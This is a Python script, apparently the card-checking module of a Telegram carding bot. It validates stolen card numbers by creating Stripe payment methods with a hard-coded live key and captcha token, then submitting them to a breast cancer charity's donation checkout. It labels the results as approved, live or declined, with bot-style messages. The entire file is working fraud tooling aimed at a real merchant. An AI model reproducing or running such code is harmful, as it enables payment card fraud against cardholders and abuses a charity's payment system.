import requests
import time
import json

def luhn_check(card_number):
    digits = [int(digit) for digit in card_number.replace(" ", "")][::-1]
    checksum = 0
    for i, digit in enumerate(digits):
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return checksum % 10 == 0

def process_card(card_data):
    start_time = time.time()
    session = requests.Session()
    
    try:
        cc, mes, ano, cvv = map(str.strip, card_data.split('|'))
        if not luhn_check(cc):
            msg_text = "Failed in luhn check"
            execution_time = time.time() - start_time
            bot_msg = f"""
<b>Sᴛʀɪᴘᴇ Aᴜᴛʜ » Dᴇᴄʟɪɴᴇᴅ ❌</b>
- - - - - - - - - - - - - - - - - -
<b>ᴄᴀʀᴅ ↯</b>
<code>{card_data}</code>

<b>ʀᴇsᴘᴏɴsᴇ ↯</b>
<pre>{msg_text}</pre>
- - - - - - - - - - - - - - - - - -
<b>ɢᴀᴛᴇᴡᴀʏ:</b> Stripe | <b>ᴛɪᴍᴇ:</b> {execution_time:.2f}s
<b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href='tg://user?id=1861702459'>𝗩𝗘𝗡𝗢𝗠</a>
"""
            return f"{card_data}", msg_text, False, 5, bot_msg
    except Exception:
        msg_text = "Bad Format"
        execution_time = time.time() - start_time
        bot_msg = f"""
<b>Sᴛʀɪᴘᴇ Aᴜᴛʜ » Dᴇᴄʟɪɴᴇᴅ ❌</b>
- - - - - - - - - - - - - - - - - -
<b>ᴄᴀʀᴅ ↯</b>
<code>{card_data}</code>

<b>ʀᴇsᴘᴏɴsᴇ ↯</b>
<pre>{msg_text}</pre>
- - - - - - - - - - - - - - - - - -
<b>ɢᴀᴛᴇᴡᴀʏ:</b> Stripe | <b>ᴛɪᴍᴇ:</b> {execution_time:.2f}s
<b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href='tg://user?id=1861702459'>𝗩𝗘𝗡𝗢𝗠</a>
"""
        return f"{card_data}", msg_text, False, 5, bot_msg
    
    card = card_data

    try:
        headers1 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        data1 = f'type=card&billing_details[address][city]=Heathport&billing_details[address][country]=US&billing_details[address][line1]=60269+Cleora+Pine+Apt.+6&billing_details[address][line2]=Cuyahoga+County&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=sbxdzrc%40hi2.in&billing_details[name]=Mr+Brooks+Rohan&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=bf93b5f4-8e77-402a-adb1-f608d324549cd581f0&muid=ef040de5-bf28-4cd2-b356-454489a1509d441557&sid=ce7bdf50-68fd-433c-93f7-436f1eb6e239983d2a&payment_user_agent=stripe.js%2F2b425ea933%3B+stripe-js-v3%2F2b425ea933%3B+split-card-element&referrer=https%3A%2F%2Fbreastcancerresearch.enthuse.com&time_on_page=126629&key=pk_live_ftYOjqGtfMkXICnngj1VQh99&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUVZaWkg2UzBSTzFjUGJsV2RrdDZhdE80VGFiY29RQXZZUjY1ZzdzSXptTDdNVnJCMWpEK2VHakVSdHVGclkwRXNGWVFZYk9YbVhDZFUyd1pDNVNoalBObUl6b1ozL1VGVUVCMHZIZjNHQXVXYzdKK1NOMjRoS2x0bE1xTFRuQ1dmZ3NPWnVaMkcwMmdpMW1LV2NBMkhLenJRbkJkazVWOUNUVzREcThNc0hyWDNLZjJyK1Zzek5WeWRZVGVkOVpxMHZwSWNuc1d3L0NxaU9QaUp3cUQ1ZDNvVkdHYVRmOSs4ZjkzeWp4K3FFS0JVNzVpZU1LTkZhTndNRkExTSszZnltK1dkYnp4eGJUbFB5cFdwMks3UlVEMDFvalRHZm1uSHlJTGlFUm9yLzQwRVpGUTRwVlhKODNBT3Ryejk5bFl3TWxOdzdGT0IrSGEzTXU2QlkzMmdwN3RKa3NjdVdkZUVzd0QxRUtpY3F3TTZMT1poZm5mT1NvaEZyS3dlUkVNeHNadGhyMEt1Z3NUdTB1QjRVN2dOM2lGYjBTd2ZUSXJ5bEJLRlN0UU9DSmRHc0JIRm43R1phQzh0cXZZNDFaM3JDRnZxZ2orYlVlUU9qN3FoRXVTTE5ocWxoaHdzWGpFRkl4bitqYVo3MG9DbHo2ZS82TGlWeXVrVDZsb2VlOFk5ckp4R2dQUDU0ZTFvcUorSUlET0ZJeVNWNlIrdlRzdUxCYnc5VE93RHdVMDdpYzVCNnhneFAwS1cvdnE0cDFKMVFubEpSUCtubDFNc2dmdXVuaW5mK3N0dDBtZUtiRjhtRHRjOHBwSFl0YUJpd25qM3MxSzladmdwM0dLK0dBb0x4K25vdGZzTlNZakNUcGM0NWdoMDBmaDArTTlkd0FQbk9FT1RqY1VRZnp4bloxajlxeGtCaUtkQ2pLTHdkcnlEVUJYMjZFZmZKbDZ0WHpBMGk5M2k1VnJtbzNObThUbXh4VEhsemd5MSt5Q0ZoV0xlSGx5YlFOU2hIUGxNWjloWkEzQWY0Y1pLZlVCd3hpWFdCRnkweVI2V2JCMjFHRlNsS285WXo1dEdwZm1YaUt3cEs3VjFiSTZ3VERaQjUwTTZXSDlpbDNpTHNVeWdiK1ZmSTI5cFc2eXpRVTZ1bko0SzFhUGd6aDdZT0dQTk9PUUNENmZna2d1MktPRCtWTVM5cjF6RTNKMXp2TDBLZHl2R1lGem9tNGFFM1Fwa3FvZUFvTHJZMDd1ZnE3Y25DZ2NhQVcrVWcwMHpnc3B2NmVOcGRVUTIyNFZHbUhoc1lnTlZIeVZiQmlTZktheXY0RytRb3ZCcEVKVlAvVnF0MHRxZnVJUTR4OWNaTzArR2lnY1FJN2p0UHhaVCtYeXlEWEF1RUxTekZLc1o5eEZrS21VRzBlTUdzWk9oZUVYZ1VQV1RXRit2YUNXUS9BdytlYU0yYWVjOFFQeEN1OXd0VWd3NG44UnJIcjNWQ0RNaWFuOVVZallJUVdzS2ZpRFZGQmdSckVGdkhlQUhGckc0cmJheGQ3T0IxeUNKc2xkVGx4Rm5GMHdpU2JReHlxNlB3VGc2RSt4Y3djWDhIRW9MWlVibjlVVk5OWnN3N043WUZPMDQ5d3lLRzN3bnhRd0tnSHd6MW1aVEc0amxZNGV3ZG9FQXVRY01vMVc1ZVZBczR5a3MvSlBwcElCa2NIV1BNTmF0RTVpazVWYXZ2YUF2bWRKaHh3NXIzd2VxV3YrRm5EUW5DZUd5cUhxSFU4d0ZuZXdKZVhNOVJ1ZktRMnpkT1dqM0Z3aTRodGZMZWVOUHdUTWxnR0YvL2l5YXpHbzBveDJib2lVVXZZM2U2WkxJV1I1WHdtcnN1VWh3cVlTMnVtazY2T2YwL1grUHp2S21zNXVyMk5EZk05cmdRZjhVdWhKZjViNXF2NXRGRE5jWFFpUUsvSzI2S20yV0tETHZxR21ZNUpiS0Z1K3A4VE9DZWV3eFA1QnRFUHNHb1FGRU8xMVc3VHc5bWc0S0RYbUd0NTMrOHExQnZJWUlhbGNLeU80Z05pZ3U3M0dBUDFGai9QTGZjWWFGMXJpQjRtNVNtTzdJalBpNWsrcXZCMWVzc1dGVCttUENyVSt4ZGJNUW5MOWZadzdLdDdyTnlCd3JKdXIrWTdacHhLakdJSEdQc045TTJyWUJ0WHlTYU1MRGNqeld5Tmd0ck84Y3NyVXg5SHZXVEVPMExwZXNTd3hmek94RzZoYytOdFdFM1d2NzFETXZNUUJ2dTJUdENYWVdYRVgrS0FtaTRnMGw2d3V1OXRFM1FySVJtWWE5R0wwNkpacDg5QkpmOW5BU3ozaXFZOGJ4bEN0Ly9ESGg4NHV0SFVtcXNUdXBDQ2wycGN4d1dvRHR3bkdVNm5YQjJVNEF3MHg5T2t2NFh4dDFzSFZQMDNUWVExa2hxMzFYQVdJaUMvK21TUHh5TWpoOEVNdzA4UUlQeTdwOTVVZEZBNmI3UW9qZXRjZ2pPMHBPdXZJNkZUSitYYWJZTnhCYzVQYVMwU01tQ1RjbE1zQ0pFWHlWeHZ0QmxvUzVaSURsbXAvNDBoSG5CUmR5S3NZNXRsUzFWVHdHbzVLYWJzU2F4TFhEcUJCREx1RDY2RlZvVy9TQmRIaVBlNFRzdFdJTHV6NHorOWN1SWhWS3NqdzVLNW90d1ZxQThyUXl1dW9sQUYxb0gvUURrWkZISzJzRFQ4YzBWQ2FnR2hqQUtOZHd4NW9jWTlEVmVXSnVjajJ2amtYNXlreGVLTEVNRzJaRzI0PSIsImV4cCI6MTc0NzU1NTI3MCwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI1MDEzNmI3IiwicGQiOjAsImNkYXRhIjoiUmpYZCtPSW9wUllhcy8yUVdzL2REUDMxWFdCYW93cTZrVVR0QlpkWUtBUUpneEdMOC9FbFRzZnZQbjgyQWp0ZTRyT3MvTG9QMzFGbW55QVRJOW8zelVwZ1BWdHNmSVhDWXJhODVQY2dpbTVIWTk2cGJuZG15a3BWc3Z4TEF5Wi9UWEJ0MnhyUnJKS3lUS29BRUM4Z3VmOTBkRVhyWVZuU3VFZXkzQmJtSHVHUkZ5OHM4ajRLejBQS2hSbnhrUHM4T1YwdjhQU0tYZUVUdHVJUSJ9.tkvFUaCs7qALz6IT2SyEmcqtr5cI0OMz6LAZuy2lwIg'
        response1 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
        
        if 'id' not in response1.json(): raise Exception("Failed to create Payment Method ID")
        pm_id = response1.json()['id']

        headers2 = {
            'authority': 'breastcancerresearch.enthuse.com',
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://breastcancerresearch.enthuse.com',
            'referer': 'https://breastcancerresearch.enthuse.com/cp/5353d/fundraiser?&key=9eddf8c7-5b62-4f61-bcb9-94fa2add96f5',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        json_data2 = { 'key': '9eddf8c7-5b62-4f61-bcb9-94fa2add96f5', 'paymentMethodId': pm_id, 'threeDSecureSupported': True, 'stripeConnectedAccountId': 'acct_1LsP7SS6jM7JbDr4', 'cardCountryCode': 'IT' }
        response2 = session.post('https://breastcancerresearch.enthuse.com/checkoutstate/pay/stripe', headers=headers2, json=json_data2)
        response2_text = response2.text
    
    except Exception as e:
        execution_time = time.time() - start_time
        msg_text = "Your card was declined."
        bot_msg = f"""
<b>Sᴛʀɪᴘᴇ Aᴜᴛʜ » Dᴇᴄʟɪɴᴇᴅ ❌</b>
- - - - - - - - - - - - - - - - - -
<b>ᴄᴀʀᴅ ↯</b>
<code>{card_data}</code>

<b>ʀᴇsᴘᴏɴsᴇ ↯</b>
<pre>{msg_text}</pre>
- - - - - - - - - - - - - - - - - -
<b>ɢᴀᴛᴇᴡᴀʏ:</b> Stripe | <b>ᴛɪᴍᴇ:</b> {execution_time:.2f}s
<b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href='tg://user?id=1861702459'>𝗩𝗘𝗡𝗢𝗠</a>
"""
        return f"{card_data}", msg_text, False, 5, bot_msg
    
    execution_time = time.time() - start_time
    msg_text = "Unknown Response."
    add_num = 5
    bot_msg = None
    
    error_msg = ""
    try:
        response_json = json.loads(response2_text)
        if response_json.get('success') or response_json.get('paid'):
            error_msg = "succeeded"
        elif 'error' in response_json or 'errors' in response_json:
            if 'error' in response_json: error_msg = str(response_json['error'].get('message', '')).lower()
            elif 'errors' in response_json: error_msg = str(response_json['errors']).lower()
        else:
            error_msg = response2_text
    except:
        error_msg = response2_text

    if "succeeded" in error_msg:
        msg_text = "Succeeded"
        add_num = 1
        bot_msg = f"""
<b>Sᴛʀɪᴘᴇ Aᴜᴛʜ » Stripe auth ✅</b>
- - - - - - - - - - - - - - - - - -
<b>ᴄᴀʀᴅ ↯</b>
<code>{card}</code>

<b>ʀᴇsᴘᴏɴsᴇ ↯</b>
<pre>{msg_text}</pre>
- - - - - - - - - - - - - - - - - -
<b>ɢᴀᴛᴇᴡᴀʏ:</b> Stripe | <b>ᴛɪᴍᴇ:</b> {execution_time:.2f}s
<b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href='tg://user?id=1861702459'>𝗩𝗘𝗡𝗢𝗠</a>
"""
    
    elif "security code is incorrect" in error_msg or "security code is invalid" in error_msg or "incorrect_cvc" in error_msg:
        msg_text = "Your card's security code is incorrect."
        add_num = 4
        bot_msg = f"""
<b>Sᴛʀɪᴘᴇ Aᴜᴛʜ » APPROVED ➜ CNN ✅</b>
- - - - - - - - - - - - - - - - - -
<b>ᴄᴀʀᴅ ↯</b>
<code>{card}</code>

<b>ʀᴇsᴘᴏɴsᴇ ↯</b>
<pre>{msg_text}</pre>
- - - - - - - - - - - - - - - - - -
<b>ɢᴀᴛᴇᴡᴀʏ:</b> Stripe | <b>ᴛɪᴍᴇ:</b> {execution_time:.2f}s
<b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href='tg://user?id=1861702459'>𝗩𝗘𝗡𝗢𝗠</a>
"""
        
    elif "insufficient funds" in error_msg:
        msg_text = "Your card has insufficient funds."
        add_num = 3
        bot_msg = f"""
<b>Sᴛʀɪᴘᴇ Aᴜᴛʜ » APPROVED ➜ INSUFF FUNDS ✅</b>
- - - - - - - - - - - - - - - - - -
<b>ᴄᴀʀᴅ ↯</b>
<code>{card}</code>

<b>ʀᴇsᴘᴏɴsᴇ ↯</b>
<pre>{msg_text}</pre>
- - - - - - - - - - - - - - - - - -
<b>ɢᴀᴛᴇᴡᴀʏ:</b> Stripe | <b>ᴛɪᴍᴇ:</b> {execution_time:.2f}s
<b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href='tg://user?id=1861702459'>𝗩𝗘𝗡𝗢𝗠</a>
"""
        
    elif "transaction_not_allowed" in error_msg:
        msg_text = "Transaction Not Allowed"
        add_num = 2
        bot_msg = f"""
<b>Sᴛʀɪᴘᴇ Aᴜᴛʜ » LIVE ✅</b>
- - - - - - - - - - - - - - - - - -
<b>ᴄᴀʀᴅ ↯</b>
<code>{card}</code>

<b>ʀᴇsᴘᴏɴsᴇ ↯</b> {msg_text}
- - - - - - - - - - - - - - - - - -
<b>ɢᴀᴛᴇᴡᴀʏ:</b> Stripe | <b>ᴛɪᴍᴇ:</b> {execution_time:.2f}s
<b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href='tg://user?id=1861702459'>𝗩𝗘𝗡𝗢𝗠</a>
"""
        

    else:
        # This is the generic decline case.
        # Check if error_msg is meaningful. If not, use a default message.
        if not error_msg or error_msg.strip() == "" or error_msg.lower() == "none":
            msg_text = "Your card was declined."
        else:
            # If there is a message, use it, but shorten if it's too long.
            msg_text = error_msg.capitalize() if len(error_msg) < 80 else "Your card was declined."
        
        # Set the numeric code for decline
        add_num = 5
        
        # ALWAYS build the final bot message for declines
        bot_msg = f"""
<b>Sᴛʀɪᴘᴇ Aᴜᴛʜ » Dᴇᴄʟɪɴᴇᴅ ❌</b>
- - - - - - - - - - - - - - - - - -
<b>ᴄᴀʀᴅ ↯</b>
<code>{card_data}</code>

<b>ʀᴇsᴘᴏɴsᴇ ↯</b>
<pre>{msg_text}</pre>
- - - - - - - - - - - - - - - - - -
<b>ɢᴀᴛᴇᴡᴀʏ:</b> Stripe | <b>ᴛɪᴍᴇ:</b> {execution_time:.2f}s
<b>𝗕𝗢𝗧 𝗕𝗬:</b> <a href='tg://user?id=1861702459'>𝗩𝗘𝗡𝗢𝗠</a>
"""
    time.sleep(10)
    return f"{card_data}", msg_text, True, add_num, bot_msg
